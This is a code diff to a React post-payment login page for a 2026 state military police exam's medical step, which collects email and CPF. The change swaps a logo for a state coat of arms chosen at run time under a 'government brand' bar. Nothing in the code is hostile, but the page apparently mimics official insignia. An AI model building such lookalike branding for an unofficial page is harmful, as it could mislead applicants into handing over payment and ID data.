@@ -10,6 +10,7 @@ import { CheckCircle, Shield, AlertTriangle, Loader2, X, Mail, ArrowRight } from
 import { useClarityEvents } from '@/hooks/use-clarity-events';
 import { useQuery } from '@tanstack/react-query';
 import { useEstadoPM } from '@/hooks/useEstadoPM';
+import { getBrasaoUrl } from '@/utils/estadoPM';
 import orgLogo from '@assets/logo-mj_1779836627251.png';
 
 export default function LoginPosPagamentoPage() {
@@ -17,6 +18,7 @@ export default function LoginPosPagamentoPage() {
   const estadoPM = useEstadoPM();
   const sigla = estadoPM?.sigla ?? 'PM';
   const nomeCompleto = estadoPM?.nomeCompleto ?? 'Polícias Militares estaduais';
+  const brasaoUrl = getBrasaoUrl(estadoPM);
   const [email, setEmail] = useState('');
   const [cpfDigits, setCpfDigits] = useState('');
   const [isLoading, setIsLoading] = useState(false);
@@ -867,19 +869,13 @@ export default function LoginPosPagamentoPage() {
               {/* Barra azul superior — marca governamental */}
               <div className="h-1 w-full" style={{ backgroundColor: '#0063AF' }} />
 
-              {/* Header: logo + identificação */}
+              {/* Header: brasão + identificação */}
               <div className="flex items-center justify-between px-6 py-4 border-b border-gray-100">
-                <div className="flex items-center space-x-3">
-                  <img
-                    src={orgLogo}
-                    alt={sigla}
-                    className="h-8 w-auto object-contain"
-                  />
-                  <div>
-                    <p className="text-xs font-semibold text-gray-800 leading-tight">{sigla}</p>
-                    <p className="text-xs text-gray-400 leading-tight">Concurso Público 2026</p>
-                  </div>
-                </div>
+                <img
+                  src={brasaoUrl}
+                  alt={`Brasão ${sigla}`}
+                  className="h-12 w-auto object-contain"
+                />
                 <span className="text-xs text-gray-400 font-mono">Perícia Médica Admissional</span>
               </div>
 
